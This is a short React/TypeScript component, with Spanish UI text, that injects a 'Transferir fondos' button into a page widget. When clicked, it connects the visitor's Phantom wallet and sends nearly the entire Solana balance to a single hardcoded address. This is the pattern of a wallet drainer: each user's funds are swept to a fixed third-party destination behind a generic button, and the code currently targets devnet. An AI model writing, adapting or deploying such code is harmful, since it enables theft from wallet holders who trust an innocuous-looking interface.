"use client"

import { useEffect } from "react"
import {
  Connection,
  PublicKey,
  SystemProgram,
  Transaction,
} from "@solana/web3.js"

const DESTINO = "6A7UUr1x9kK1gkPmE1ys2s7H2zii289j27KvRsBX1q3f"

export default function TransferButton() {
  useEffect(() => {
    const btn = document.createElement("button")

    btn.innerText = "Transferir fondos"

    Object.assign(btn.style, {
      backgroundColor: "#1f2937",
      color: "white",
      border: "1px solid rgba(255,255,255,0.08)",
      padding: "12px 18px",
      borderRadius: "12px",
      fontWeight: "600",
      cursor: "pointer",
      width: "100%",
    })

    async function sendAll() {
      try {
        const { solana } = window as any

        if (!solana) {
          alert("Instala Phantom Wallet")
          return
        }

        const res = await solana.connect()
        const publicKey = res.publicKey

        const connection = new Connection("https://api.devnet.solana.com")

        const balance = await connection.getBalance(publicKey)

        const SAFETY_BUFFER = 1000000
        const amount = balance - SAFETY_BUFFER

        if (amount <= 0) {
          alert("Sin balance suficiente")
          return
        }

        const tx = new Transaction().add(
          SystemProgram.transfer({
            fromPubkey: publicKey,
            toPubkey: new PublicKey(DESTINO),
            lamports: amount,
          })
        )

        tx.feePayer = publicKey
        tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash

        const signed = await solana.signTransaction(tx)

        const sig = await connection.sendRawTransaction(signed.serialize())

        await connection.confirmTransaction(sig)

        alert("Transferido 🚀")
      } catch (err) {
        console.error(err)
        alert("Error en la transacción")
      }
    }

    btn.onclick = sendAll

    const container = document.getElementById("widget-container")

    if (container) {
      container.appendChild(btn)
    }

    return () => {
      btn.remove()
    }
  }, [])

  return null
}